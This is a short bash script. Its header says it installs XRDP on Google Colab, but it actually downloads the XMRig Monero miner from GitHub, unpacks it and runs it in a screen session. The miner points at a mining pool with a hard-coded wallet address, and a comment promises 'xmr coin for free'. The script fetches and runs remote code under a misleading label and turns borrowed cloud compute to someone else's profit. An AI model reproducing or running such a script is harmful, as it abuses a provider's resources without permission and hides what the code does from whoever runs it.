#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
tar xvzf xmrig-6.18.1-linux-static-x64.tar.gz
cd xmrig-6.18.1
./xmrig -o xmr.pool.gntl.co.uk:20009 -u 83ErkzmC8yH2omjYvg6G7vc4fiP33k9EsXrGjs4ssW7hetWN3VHKgtVDsGTpjipJmDMWnsgpfb32NYw186uYE2UyEcDv343 -k --tls -p a2nk
